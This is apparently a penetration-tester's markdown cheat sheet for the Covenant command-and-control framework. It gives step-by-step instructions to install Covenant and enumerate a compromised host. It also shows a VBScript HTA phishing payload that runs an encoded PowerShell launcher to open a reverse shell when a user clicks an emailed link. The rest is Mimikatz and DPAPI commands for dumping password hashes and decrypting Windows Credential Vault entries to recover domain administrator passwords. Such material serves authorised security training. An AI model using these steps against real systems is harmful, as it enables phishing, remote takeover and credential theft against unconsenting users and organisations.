# Covenant

## Installation

### Install Dotnet

```
cd /tmp  
wget https://packages.microsoft.com/config/ubuntu/21.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb 
sudo dpkg -i packages-microsoft-prod.deb 
sudo apt update -y  
sudo apt-get install -y apt-transport-https dnsutils 
sudo apt-get update  
sudo apt-get install -y dotnet-sdk-3.1 
```

### Install and launch Covenant

```
sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /opt/Covenant 
cd /opt/Covenant/Covenant
sudo dotnet run
```

## Local Enumeration

- Suppose we have a grunt (a shell on the target) so we want to enumerate the target
- Click on the grunt > Interact
- Use Seatbelt `Seatbelt -group=all`
  - We will get useful info: local users, dns info (such as email domain and all), interesting files, etc.
- Use the cmd `GetDomainUser` to enumerate domain users
- Use the cmd `GetNetLoggedOnUser`to have a list of logged on users
- Use the cmd `GetNetLocalGroup` to have a list of local group
- etc.

## hta Email Phishing

- Create and hta file in your attacking machine:

```
<script language="VBScript">
  Function DoStuff()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.run "<powershell command here>"
    Set wsh = Nothing
  End Function

  DoStuff
  self.close
</script>
```

- Create an HTTP listener in Covenant
  - Listener > create 
  - The table in listener should look like this  
    | Name        |    ListenerType | Status | StartTime	    |        ConnectAddresses   |   ConnectPort|
    |-------------|-----------------|--------|----------------|---------------------------|--------------|
    |HTTP Listener |	HTTP 	        |Active 	|3/7/2022 8:28:13 PM |	IP-OF-ATTACK-MACHINE 	    | 80

  - Go to Launchers > Powershell
  - Fill up the info, be careful taht the killdate is later in the future (not in the past)
  - Click on generate
  - Copy the encoded Launcher and put it in the script above instead of `<powershell command here>` 
  - Save the script
  - Go back to Listerners click on the listener that was just set up 
  - Go to Hosted Files, in Path enter `/name-of-your-script.hta`
  - Click on Browse and select your script
  - And click on create
  - If we go to `http://localhost/name-of-your-script.hta` we should be able to download it
- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
- When the user will click the link an run the script we will get our reverse shell
- If we go to Covenant again and check in Grunt we should have a new one
- If you are not able to execute command (they stay Uninitialized) try either of those:  
  - Verify the kill date of the launcher
  - the UI may not allow changing the date.  This can be fixed by deleting the `/opt/Covenant/Covenant/data/covenant.db` file and restarting the service. You will lose all data and need to create a new user to log in with.

## Dump hashes with mimikatz

- In a high grunt
- We can use this to see if any plaintext info might come out `Mimikatz token::elevate lsadump::secrets`
- Will dump the sam file (where password hashes are stored in windows)`Mimikatz token::elevate lsadump::sam`
- Covenant will save the Crendentials in the Data section as well

## Cracking Credential Vault with mimikatz

- We need a medium integrity grunt
- `mimikatz vault::cred` will show all services with persisted passwords
- `ls C:\users\user\appdata\local\microsoft\credentials` will list the passwords files the smallest of the files is gemerally the one we need.
- We then go to the tab tak in our grunt. We select Mimikatz from the list and type this task: `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\FILE-PREVIOUSLY-CHOSEN"`
- From the output of the task we need to keep aside the value of the guidMasterKey 
- `ls C:\users\user\appdata\roaming\microsoft\protect` this should list a directory with an sid value in the end
- If you do an ls on this it should list the same path with the guidMasterKey value we previously found. We need to copy the full path, and then we go to task again and using mimikatz we need to type `"dpapi::masterkey /in:C:\users\user\appdata\roaming\microsoft\protect\sid\guidMasterKey /rpc"`
- This way we will het in the end of the output the key for the domain controller which should look like this: `key : 60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
- We need to keep this key aside
- We go back to task and we type `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\sid /masterkey:<PASTE-THE-KEY-HERE>"
- This should dump the domain password, you should see it at the end of the output:
  ```
  UserName       : domain\Administrator
  CredentialBlob : Password123!
  ```

## Resources

{% embed url="https://github.com/cobbr/Covenant" %} Get Covenant here {% endembed %}
{% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} Movement Pivoting and Persistence - TCM Security Academy {% endembed %}
